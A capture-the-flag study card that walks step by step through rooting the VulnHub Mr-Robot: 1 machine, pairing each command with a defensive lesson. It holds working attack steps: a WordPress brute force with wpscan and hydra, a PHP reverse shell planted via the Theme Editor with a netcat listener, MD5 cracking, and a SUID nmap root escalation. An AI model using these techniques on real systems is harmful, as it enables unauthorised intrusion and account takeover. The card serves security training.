# Machine 7 — Mr-Robot: 1

> **Position:** 7 of 13 · the midpoint · **Band 3 — Easy** (global rank **053** of 708)
> **Full writeup:** [`labs/3-053-mr-robot-1/README.md`](../../labs/3-053-mr-robot-1/README.md)

| | |
| --- | --- |
| **Machine** | Mr-Robot: 1 |
| **Author** | Leon Johnson |
| **Released** | 28 June 2016 |
| **Target OS** | Ubuntu 14.04 — Apache + **WordPress** |
| **VulnHub** | [entry/mr-robot-1,151](https://vulnhub.com/entry/mr-robot-1,151/) |
| **Keys** | 3 (increasing difficulty) |
| **Estimated time** | 4–6 hours |

- ⚠️ **Verification note (metadata):** VulnHub confirms **Author: Leon Johnson** and **release 28 Jun 2016**, but lists the OS only as **"Linux"** — "Ubuntu 14.04" comes from the kernel in lab output (`3.13.0-55-generic`), and one writeup (Jack Halon) starts its shell under a **Bitnami** path (`/opt/bitnami/...`), so exact web paths may differ between writeups. Table values kept as written.

---

## How to use this card

Same template: **A** (method + theory) · **B** (the machine) · **C** (every command, logically) · **D–H**
(defence, review, hints, sources, rescue). New theory this week: **content discovery** and how to read
response codes, why `robots.txt` is **not a security control**, what a **username enumeration oracle** is
(with the exact WordPress error strings), **wordlist hygiene**, why **a CMS admin = code execution**,
**salted vs unsalted hashing**, and **SUID vs the effective UID (`euid`)**. Every Part C step ends with the
**defensive lesson** it teaches — read those even if you skip the commands.

---

# Part A — The method (theory)

## A.1 Content discovery

Finding **files a site has but its homepage does not link to**. The server serves whatever it has; it does not advertise a listing — so you throw wordlist paths at it (`dirb`, `gobuster`, `ffuf`) and, the actual skill, **classify the responses**: `200` exists but may still be a dead end · `301/302` moved, and the redirect target often reveals a **real directory** · `403` exists but forbidden (existence is intelligence) · `404` not found — *or* deliberately hidden; retest with extensions (`.php`, `.bak`).

**`robots.txt`** is the **first file** you read on any site — one `curl`, zero noise. It is a polite **convention** for crawlers and it is **public by design**, so anything it lists is **published**: the file that asks crawlers to hide your secrets *shows them to every human who reads it*. Here the site publishes its **own password dictionary** (`fsocity.dic`) and the first key.

## A.2 The username enumeration oracle

How can a login form tell you a username **exists** without ever accepting a login? By returning a **different error message** for the two cases:

- *"Invalid username"* → the name does **not** exist.
- *"The password you entered for the username X is incorrect"* → the name **does** exist.

A tool that can tell failure type A from failure type B holds an **oracle**: it answers a yes/no question you were not supposed to ask. This **halves** the search space — a **two-unknown** problem (user × password) becomes two **one-unknown** runs. Those exact strings are also what you feed `hydra`'s failure test (`F=Invalid username`, then `F=is incorrect`). WordPress leaks the same fact a second way: `/?author=1` **redirects** to `/author/<username>/` — which is exactly what `wpscan -e u` loops over.

## A.3 Wordlist hygiene: why to de-duplicate

`fsocity.dic` has **858,160 lines**; after `sort -u` it is **11,451** — **75× smaller** with **zero loss of coverage**, because a repeated password only needs trying once. The raw list would take 75× longer for the *same* result — and look 75× worse in the logs (brute-force detection counts attempts, not successes). **Always clean a list before attacking.**

## A.4 Why a CMS admin is **code execution**

A WordPress admin can edit theme **PHP** from the browser — a **feature, not a bug** (owners tweak templates without FTP). But every theme PHP file is executed **server-side** by Apache on request, so "WordPress admin" equals "code execution on the web server". **Admin accounts therefore need the same protection as server credentials.**

## A.5 Salted vs unsalted hashing

**Unsalted** (MD5): same password → **always the same hash**, so rainbow tables work and a GPU guesses **billions**/second — one table breaks *every* account sharing that password. **Salted** (bcrypt/argon2): a random **salt** per user makes the same password hash differently each time, and the algorithm is **deliberately slow**. 32 hex characters = MD5 length; `--format=Raw-MD5` kills the ambiguity (it could be NTLM/MD4).

## A.6 SUID and the effective UID — the theory for Step 8

**SUID** (*set-user-ID*) makes a program run with the privileges of the **file's owner**, not the caller — that is why `passwd` is SUID-root (ordinary users must edit `/etc/shadow`). In a listing you read it as an **`s`** where the owner's execute bit would be: `-rwsr-xr-x`. Linux tracks two identities: `uid` (who you really are) and **`euid`** (whose permissions this process may use *now*); a SUID binary owned by root runs with `euid=0`. So: powerful binary + SUID = that power is yours. The discipline: `find` the SUID set, **diff it against the stock OS list**, look each odd entry up on **GTFOBins** — which lists nmap's `--interactive` shell for versions **2.02–5.21** and remarks it works only where "the shell does not drop SUID privileges".

---

# Part B — The machine

## B.1 What you will learn

1. Treat **`robots.txt`** as the first file you read — and why it is not a control.
2. **Content discovery** with `dirb`/`gobuster`/`ffuf`, and how to **read response codes**.
3. Understand and exploit a **username enumeration oracle** (the two exact WordPress errors).
4. **Clean and de-duplicate a wordlist** before using it.
5. Turn **WordPress Administrator** access into code execution via the **Theme Editor**.
6. Upgrade a raw netcat shell to a **PTY** — mandatory here, because otherwise `su` fails.
7. Identify an **unsalted MD5** hash by length, and crack it with John.
8. Escalate via **SUID `nmap` 3.81**'s `--interactive` mode — and read `uid` vs `euid` in `id`.

## B.2 The map (network surface + 3 keys)

| Port | State | Service | How to read it |
| --- | --- | --- | --- |
| 22/tcp | closed | ssh | Refused → **no SSH brute-force path** (⚠️ Part G note) |
| 80/tcp | open | Apache httpd | The entire attack surface lives here |
| 443/tcp | open | ssl/http | Same Apache over TLS — writeups attack port 80 |

| Key | Where | Technique |
| --- | --- | --- |
| 1 | `robots.txt` → `key-1-of-3.txt` | file disclosure |
| — | `fsocity.dic` (published dictionary) | clean → brute force |
| 2 | `/home/robot/key-2-of-3.txt` | MD5 crack → `su robot` |
| 3 | `/root/key-3-of-3.txt` | SUID `nmap --interactive` → `!sh` |

## B.3 Before you start

- [02 — Web Attacks](../02-Web-Attacks.md) **§2** (content discovery) and §7 (WordPress/`wpscan`).
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) **§1** (MD5), **§2** (wordlist hygiene), **§4** (John).
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§2** (SUID — read before Step 8).
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md) **§2** — the TTY upgrade is **mandatory** here.

**Answer before:**
1. What is `robots.txt` for, and why is putting a secret in it equivalent to publishing it?
2. A wordlist has 858,160 lines. What is your first action, and why?
3. How can a login form tell you a username is valid without accepting a login?
4. What is the difference between **salted** and **unsalted** hashing?
5. Why will `su` fail in a raw netcat shell but work after a PTY upgrade?
6. A `find` output shows fifteen SUID binaries. Which one do you distrust, and on what evidence?

---

# Part C — The walkthrough, step by step

## Step 1 — Scan

**Theory first.** You cannot attack what you have not found. One scan decides the box: which ports exist, what answers on them, and — via `-sC` — whether the default scripts hand you the first lead for free.

```bash
mkdir -p scans                            # -oA cannot write into a directory that does not exist
sudo nmap -sC -sV -p- -T4 -oA scans/mrrobot TARGET
```

- `-sC` default **NSE scripts** (safe `default` category) · `-sV` **version** fingerprinting
- `-p-` all 65,535 TCP ports, not just the top 1000 · `-T4` faster on lab LANs (`-T5` **misses ports**)
- `-oA prefix` save **three** formats (normal/XML/greppable) · `sudo` enables the faster SYN scan

```text
PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  open   http    Apache httpd
| http-robots.txt: 2 disallowed entries
|_/fsocity.dic /key-1-of-3.txt
443/tcp open   ssl/http Apache httpd
```

**How to read it.** Two things decide the box. **`22/tcp closed`** — the host answered with RST, so it is up but nothing listens: no brute-force path there. And the `http-robots.txt` script **read `robots.txt` for you** — **`-sC` is not decoration**, it front-ran the first manual step of the attack. (Writeups that scan without `-sC` find `robots.txt` by hand later via `dirb`/`nikto` — same destination, more steps.)

> _Defensive lesson:_ default scripts are readable by anyone on the network — scan yourself first and fix what an attacker would see.

## Step 2 — `robots.txt`: the first file you always read

**Theory first.** Part A.1: before brute-forcing anything, take the free intelligence.

```bash
curl -s http://TARGET/robots.txt     # -s = silent: body only
curl -s http://TARGET/key-1-of-3.txt
wget http://TARGET/fsocity.dic       # download to disk
wc -l fsocity.dic                    # count lines
```

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```
```text
073403c8a58a1f80d943455fb30724b9
858160 fsocity.dic
```

**How to read it.** `User-agent: *` = "applies to every crawler"; the two bare lines are paths in the web root. `robots.txt` is **public by design**, so listing a path **publishes** it — here the site leaks its **own dictionary**. The 32-hex value is **Key 1** (it is the flag itself, not a hash to crack).

**Trap.** Do not skip `wc -l`: beginners attack the raw file for an hour, then learn their attack was 75× slower than necessary.

```bash
sort -u fsocity.dic > fsocity-clean.dic   # sort, keep only unique lines (-u)
wc -l fsocity-clean.dic                   # → 11451 fsocity-clean.dic
```

**How to read it.** **858,160 → 11,451**, a 75× reduction with no loss of coverage (Part A.3). On gigantic lists prefer `sort -u -S 1G` or `awk '!seen[$0]++'`.

> _Defensive lesson:_ everything in the web root is world-readable, forever. `robots.txt` is an announcement board, not a lock — never list a private path there.

## Step 3 — Username enumeration

**Theory first.** Part A.2: you have a dictionary but no username. Half a credential pair is worth attacking; a blind `user × password` matrix is not.

```bash
wpscan --url http://TARGET/ -e u        # -e u = enumerate users
```

```text
[+] elliot
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Wp Json Api (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

**How to read it.** Three independent detections agreeing = a reliable name. Read the labels: **Passive** = inferred from data the site publishes anyway (the RSS feed) — it does not notice you; **Aggressive** = wpscan actively probed — **this writes log entries**. The oracle behind `Author Id Brute Forcing` is `/?author=1` (Part A.2): the redirect target contains the username. Separately `wp-login.php` answers *"Invalid username"* vs *"The password you entered for the username X is incorrect"* — a second, independent oracle.

> _Defensive lesson:_ one generic message for both failures ("Invalid username or password") closes this oracle completely — see Part D.

## Step 4 — The dictionary attack with the site's own list

**Theory first.** You know one thing an attacker should never know: the site's **own** wordlist. `rockyou` is generic; `fsocity.dic` is *targeted* — the password comes from the show's lore.

```bash
wpscan --url http://TARGET/ -U elliot -P fsocity-clean.dic
# some wpscan versions want the mode spelled out (our full lab writeup uses it):
# wpscan --url http://TARGET/ --password-attack wp-login -U elliot -P fsocity-clean.dic
```

```text
[SUCCESS] - elliot / ER28-0652
```

**How to read it.** `-U` = username(s), `-P` = password **list** (file), `--url` = the site. `ER28-0652` is a **themed** password (a fictional employee ID) — exactly why a **targeted** list won where `rockyou` would not, and why `cewl` (harvesting the site's own words) is the right habit on themed boxes.

**Alternative route — no brute force.** `nikto`/`dirb` find `/license` (also `/license.txt`), whose footer holds base64: `echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 -d` → `elliot:ER28-0652` (remember Machine 6: **encoding is not encryption**). A third route: point `hydra` at the form — `http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username'` enumerates users, then `F=is incorrect` with `-l elliot -P fsocity-clean.dic` cracks the password.

> _Defensive lesson:_ never ship site-specific secrets in public files; rate limiting and lockouts make an 11k-line list useless anyway.

## Step 5 — Theme Editor → code execution

**Theory first.** Part A.4: Administrator is already RCE — you are not exploiting a WordPress bug, you are **using WordPress as designed**. Log in at `http://TARGET/wp-login.php` → **Appearance → Editor** → the theme file **`404.php`** ("404 Template") → replace its contents with a PHP reverse shell (Kali ships one at `/usr/share/webshells/php/php-reverse-shell.php`; set `$ip`/`$port` to **your** IP) → **Update File**.

```bash
nc -lvnp 4444                                     # on ATTACKER, FIRST: -l listen -v verbose -n no DNS -p port
curl -s -o /dev/null -w '%{http_code}\n' http://TARGET/this-page-does-not-exist
#   -o /dev/null throws the body away · -w '%{http_code}' prints only the HTTP status
```

```text
Ncat: Connection from 192.168.56.101.
daemon@linux:~$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

**How to read it.** A URL that does not exist forces `404.php` to render, which runs your PHP — or request `http://TARGET/404.php` directly, as some writeups do. **The theme's 404 page returns `200`**: WordPress *successfully rendered* its "not found" template. Do not read `200` as "the page exists" — the status describes the **response**, not the **resource**. **`uid=1(daemon)`** — not `www-data`; this build runs Apache as `daemon` (unprivileged either way). One writeup's shell starts under `/opt/bitnami/...`, so paths may differ from yours — the route is identical.

**Traps.** **Listener first** — a shell fired into the void is consumed and re-triggering "does nothing"; and double-check the `$ip` **inside** the payload is your attacker IP, not the target's.

**Alternative route (older writeups).** Metasploit's `exploit/unix/webapp/wp_admin_shell_upload` uploads a plugin shell instead (christophetd, Jack Halon); its common abort — *"The target does not appear to be using WordPress"* — is countered with the right `TARGETURI`, `set WPCHECK false`, or editing the module (Jack Halon's fix). The Theme Editor has none of that machinery.

> _Defensive lesson:_ **the point of the machine** — a CMS admin can write server `code`. `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`; audit theme/plugin edits.

## Step 6 — TTY upgrade (mandatory here)

**Theory first.** A raw `nc` shell is a pipe, not a terminal: no tab completion, `Ctrl+C` kills **your listener**, and anything needing a real terminal — `su`, `sudo`, `vim` — fails. Here that is fatal, because Step 7 **needs `su`**.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # spawn bash attached to a pseudo-terminal
export TERM=xterm          # tell the remote side what terminal you have
# Ctrl+Z                   # SUSPENDS your local nc; you drop back to your Kali prompt
stty raw -echo; fg         # locally: pass keys through untouched, no local echo; resume nc
```

**Why, in order.** `pty.spawn()` allocates the **pseudo-terminal** `su` reads its password from; `stty raw -echo` makes *your* terminal forward keystrokes uninterpreted (the remote side echoes), so `Ctrl+C` reaches the remote process; `fg` resumes the listener. On this VM `python -c 'import pty; pty.spawn("/bin/sh")'` (Python 2) works too.

**The trap, spelled out.** Without a TTY, `su` dies with `su: must be run from a terminal` — and the message never mentions TTYs, so beginners conclude the password is wrong. It is not. Upgrade first, then `su`.

> _Defensive lesson:_ a web-server child (`daemon`) spawning an interactive pseudo-terminal is an anomaly detection teams hunt for.

## Step 7 — The hash, and cracking it

**Theory first.** You are `daemon`; the next key belongs to `robot`. The gate between you is a password — someone stored it in a file.

```bash
ls -la /home/robot                 # -l permissions · -a include dotfiles
cat /home/robot/password.raw-md5
```

```text
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

**How to read it.** Permission strings in triplets: `key-2-of-3.txt` is **`-r--------`** (400 — owner `robot` only, so `daemon` **cannot** read it: you must **become** `robot`), `password.raw-md5` is **`-rw-r--r--`** (644 — world-readable, so you can). The file is `user:hash`, and the **filename** names the algorithm: **raw MD5**, 32 hex, **unsalted** (Part A.5).

```bash
echo 'robot:c3fcd3d76192e4007dfb496cca67e13b' > robot.hash   # single-quote: "$..." would mangle hashes
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt robot.hash
john --show robot.hash              # print results already cracked — no re-cracking
```

```text
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
abcdefghijklmnopqrstuvwxyz (robot)
1g 0:00:00:00 DONE 3842p/s
```

**How to read it.** `Loaded 1 password hash` **confirms John parsed the input** — `No password hashes loaded` means the format guess was wrong (a bare 32-hex string is ambiguous: MD5/NTLM/MD4). The result line is `password (account)`; `1g 0:00:00:00` — one guess, sub-second: **unsalted MD5 protects nothing** (Part A.5). Alternatives the writeups used: `hashcat -m 0` (mode 0 = MD5) and online crackers (CrackStation, HashKiller) — fine in a lab, but you are handing a third party the target's hash; from a real engagement, crack **locally**.

```bash
su robot
# password: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt      # → 822c73956184f694993bede3eb39f959  (Key 2)
```

`su` worked **because Step 6 gave it a terminal** — go back and redo that step if it did not.

> _Defensive lesson:_ a world-readable credential file plus unsalted MD5 is a **double** failure — `chmod 600` secrets; store passwords with bcrypt/argon2 (per-user salt, deliberately slow).

## Step 8 — Pivot, then SUID

**Theory first.** Part A.6: you are `robot`, not `root`. The privesc checklist starts with "what may I run as someone else?" — binaries carrying the SUID bit.

```bash
find / -perm -4000 -type f 2>/dev/null
#   / = whole filesystem · -perm -4000 = SUID bit set · -type f = regular files
#   2>/dev/null = throw away thousands of "Permission denied" errors
```

```text
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/bin/ping
/bin/umount
/bin/mount
/usr/local/bin/nmap        <-- the odd one out
```

**How to read it.** This is **not** one entry — it is the stock Ubuntu SUID set **plus one** (community writeups show the same list, some also with `ssh-keysign`, VMware wrappers or `pt_chown`). The technique is **diff against the baseline**: `passwd`, `sudo`, `ping`, `mount` belong there — **`nmap` does not**. And note the path `/usr/local/bin`: a **manually installed** nmap (packages put it in `/usr/bin`), which is why it is old.

```bash
ls -l /usr/local/bin/nmap        # -rwsr-xr-x ... note the S in the owner's execute slot
/usr/local/bin/nmap --version
nmap --interactive
```

```text
Nmap version 3.81 ( http://www.insecure.org/nmap/ )
nmap> !sh
# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```

**How to read it.** **nmap 3.81 still supports `--interactive`**, a mini-shell whose `!CMD` runs CMD through the OS shell (`n` = scan, `!` = shell command, `x` = exit, `h` = help). Because the binary is SUID root, the shell inherits **`euid=0`** while your real UID stays `1002(robot)` — read `id` with Part A.6 in mind: **`euid` decides what you may do**, so `/root` is now readable.

```bash
cat /root/key-3-of-3.txt          # → 04787ddef27c3dee1ee161b21670b4e4  (Key 3 — machine rooted)
```

**Closing facts from GTFOBins.** The interactive shell exists in nmap **2.02–5.21** (later versions dropped it), and even *without* it a SUID nmap stays dangerous: GTFOBins also lists **file write** (`-oG=/path`), **file read** (`-iL /path`) and **Lua execution** (`--script`) under SUID. **The lesson: an old version of a trusted tool is an attack surface — the fix is removing the SUID bit, not the feature.**

> _Defensive lesson:_ `chmod u-s /usr/local/bin/nmap`, upgrade nmap, and schedule `find / -perm -4000 -type f` audits — the SUID set should never grow on its own.

---

# Part D — Defensive lessons

| Finding | Fix |
| --- | --- |
| `robots.txt` leaks `fsocity.dic` and a key | Public by design. Move secrets behind authentication; never publish a wordlist |
| Username enumeration (two different error strings) | Identical generic message for both failures; rate limiting and lockout |
| `elliot : ER28-0652` | Strong-password policy; 2FA for admins; alert on high-volume login failures |
| `/license` leaks credentials as base64 | Encoding is not access control — scan your own web root for accidental disclosures |
| Admin can edit theme PHP | **This is a feature.** Restrict `edit_themes`; `define('DISALLOW_FILE_EDIT', true);` |
| `password.raw-md5` unsalted MD5 | bcrypt/argon2 with a per-user salt. Never store unsalted MD5 |
| World-readable credential file in `/home` | `chmod 600`; audit home directories for world-readable files |
| **SUID `nmap` 3.81** | `chmod u-s`; upgrade nmap (later versions drop interactive); audit SUID against the stock set |
| Web server allowed outbound connections | Egress-filter; a PHP reverse shell should not reach the internet |
| No alerting on web-shell activity | Alert on theme/plugin file edits and on `daemon` spawning interactive terminals |

**The single biggest lesson:** *a CMS administrator is already root on the web tier.*

---

# Part E — Review questions

1. Why did you de-duplicate `fsocity.dic`? What would the raw list have cost — and which cost (time or log noise) matters more in a real engagement?
2. Describe the username oracle precisely: both error strings, and the minimal change that closes it.
3. `password.raw-md5` was world-readable. Was the world-readable bit the vulnerability, or the MD5? Argue both.
4. Unsalted MD5 cracks in seconds. Roughly how much slower would the same password be under bcrypt, and why?
5. The password was `abcdefghijklmnopqrstuvwxyz`. Why did a **dictionary** attack find it, and why not `rockyou` first?
6. Why is SUID on `nmap` a vulnerability while SUID on `passwd` is not? What changed in later nmap versions?
7. The 404 page returned HTTP `200`. What does that status actually describe, what is the correct way to serve "not found", and why is a CMS template editor RCE by design?

---

# Part F — Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

The homepage is a themed fake IRC terminal — a **dead end** (its commands are show references, not the CTF). Ask: what is the very first file every enumerator checks? A convention file at the root, with two entries — one is a **dictionary**. Then work out the CMS (`/readme.html` and `/wp-login.php` are the usual tells).
</details>

<details>
<summary><strong>Rung 2 — what you find</strong></summary>

`curl http://TARGET/robots.txt` → `fsocity.dic` and `key-1-of-3.txt`. **Key 1** there. `fsocity.dic` is a published dictionary: `wget`, `wc -l` (858160), `sort -u fsocity.dic` (11451). Then `wpscan --url http://TARGET/ -e u` → **`elliot`**. No need to guess the username — the login form will *tell* you ("Invalid username" vs "is incorrect").
</details>

<details>
<summary><strong>Rung 3 — the credential</strong></summary>

Different message for an unknown user → oracle. `wpscan --url http://TARGET/ -U elliot -P fsocity-clean.dic` → `ER28-0652`. `elliot` is **Administrator**. Stuck on brute force? Look at `/license` and run `base64 -d` on its last line.
</details>

<details>
<summary><strong>Rung 4 — shell and pivot</strong></summary>

Appearance → Editor → `404.php` → PHP reverse shell. Listener **first** (`nc -lvnp 4444`), then request a non-existent URL. You land as `daemon`. **Upgrade the TTY** (`su` needs it — otherwise "must be run from a terminal"). `/home/robot/password.raw-md5` → John (`--format=Raw-MD5`) → `su robot`.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -sC -sV -p- -T4` → **80, 443** (22 closed; `-sC` even prints `robots.txt` for you). 2. `robots.txt` → `fsocity.dic` + **key 1** (858160→11451 after `sort -u`). 3. `wpscan -e u` → **`elliot`**. 4. `-P fsocity-clean.dic` → `ER28-0652` (or `base64 -d` on `/license`). 5. Theme Editor `404.php` → `daemon` → TTY upgrade. 6. MD5 → John → `abcdefghijklmnopqrstuvwxyz` → `su robot` → **key 2**. 7. `find / -perm -4000` → **SUID nmap 3.81** (the one non-stock entry) → `--interactive` → `!sh` → `euid=0` → **key 3** at `/root/key-3-of-3.txt`.
</details>

---

# Part G — References

- **VulnHub entry:** <https://vulnhub.com/entry/mr-robot-1,151/>
- **English lab:** [`labs/3-053-mr-robot-1/README.md`](../../labs/3-053-mr-robot-1/README.md)
- **Greek mirror of this card:** [`Μηχανές/07-mr-robot-1.md`](../../Μαθησιακή%20Διαδρομή%201%20-%20Εισαγωγή%20στην%20Κυβερνοασφάλεια/Μηχανές/07-mr-robot-1.md)
- **Cross-checked writeups** (confirm 80/443, `fsocity.dic`, `elliot:ER28-0652`, SUID nmap):
  - [Thor-Sec — Mr-Robot 1](https://thor-sec.com/walkthroughs/mrrobot1/)
  - [4pfsec — Mr-Robot 1](https://4pfsec.com/mr-robot-1-vulnhub)
  - [Anthony Priest — Mr-Robot 1](https://priest716.com/blog/posts/ctf-writeup.html)
  - [GTFOBins — nmap](https://gtfobins.github.io/gtfobins/nmap/)

- **Community notes — consensus, pitfalls and alternative routes** (cross-checked against the sources below):
  - **Consensus chain:** `80/443` (22 closed) → `robots.txt` (key 1 + published wordlist) → de-dupe `fsocity.dic` → WordPress username oracle (`wpscan -e u`, `/?author=1`, or the "Invalid username" vs "is incorrect" message) → `elliot:ER28-0652` → Appearance→Editor→`404.php` PHP reverse shell → `daemon` → MD5 crack → `su robot` → SUID `nmap --interactive` `!sh` → root key.
  - **Common pitfall:** `su robot` dies with "must be run from a terminal" until you `python -c 'import pty; pty.spawn("/bin/bash")'` — the TTY upgrade is mandatory here (the pitfall is even visible in the comment sections of the writeups below).
  - **Common pitfall:** attacking the 858,160-line list without `sort -u` is ~75× slower; and the themed homepage is a dead end — go straight to `robots.txt`.
  - **Common pitfall:** firing the reverse shell before the listener is up consumes the one-shot payload — `nc -lvnp` first, trigger second.
  - **Alternative route:** the credentials are also leaked on `/license` (a.k.a. `/license.txt`) as base64 `ZWxsaW90OkVSMjgtMDY1Mgo=` → `elliot:ER28-0652`, skipping the brute force entirely (Thor-Sec found it with `dirb`, Jack Halon with `nikto`).
  - **Alternative route:** older writeups pop the shell with Metasploit `exploit/unix/webapp/wp_admin_shell_upload` instead of the Theme Editor; the frequent abort "The target does not appear to be using WordPress" is countered with the right `TARGETURI`, `set WPCHECK false`, or editing the module (Jack Halon's route). Hash-cracking alternates used: `hashcat -m 0`, CrackStation, HashKiller.
  - **Dead ends reported by writeups:** a second WordPress account found in the database (`mich05654` / `Dylan_2791`, christophetd) grants nothing extra; from *inside* the box `nmap localhost` also shows FTP `21` and MySQL `3306`, but they are loopback-only (invisible to your external scan) and lead nowhere without credentials.
  - ⚠️ **Verification note (port 22):** our full lab writeup's sample scan shows `22/tcp open ssh (OpenSSH 8.2p1)`, while the community writeups fetched for this card (christophetd, Jack Halon, Thor-Sec, priest716) all show `22/tcp closed ssh`. The card keeps **closed**; either way **no writeup ever logs in over SSH**, so treat it as a non-route.
  - ⚠️ **Verification note (WordPress version):** writeups disagree — `4.3.9` (christophetd, via `/readme.html`), `4.3.6` (Jack Halon's `/readme.html` and our lab's wpscan), `4.3.4` (Jack Halon's wpscan fingerprint), `4.3.1` (4pfsec). The card therefore states **no version**; the disagreement itself is the lesson — version detection is an estimate, cross-check it.
  - **Verified sources:** [christophetd](https://blog.christophetd.fr/write-up-mr-robot/) · [Thor-Sec](https://thor-sec.com/walkthroughs/mrrobot1/) · [4pfsec](https://4pfsec.com/mr-robot-1-vulnhub) · [Jack Halon](https://jhalon.github.io/vulnhub-mr-robot1/)

---

# Part H — If you get completely stuck

- Verify connectivity: `ping TARGET`, `ip -br a`.
- **Upgrade the TTY before `su`** — otherwise "must be run from a terminal".
- If `wpscan` is slow, remember: the list must be the **cleaned** one (`fsocity-clean.dic`, 11,451 lines).
- No reverse shell? Check the order: **listener first**, then trigger `404.php` — and verify the `$ip` inside the payload is your attacker IP, not the target's.
- If `find / -perm -4000` shows many binaries, the answer is the **one that is not stock** — `/usr/local/bin/nmap`; look it up on GTFOBins.
- Check [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md).
- Revert the snapshot and redo from memory.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 6 — bossplayersCTF: 1](06-bossplayersctf-1.md) · next: [Machine 8 — Empire: Breakout](08-empire-breakout.md) · full writeup: [`labs/3-053-mr-robot-1`](../../labs/3-053-mr-robot-1/README.md)._
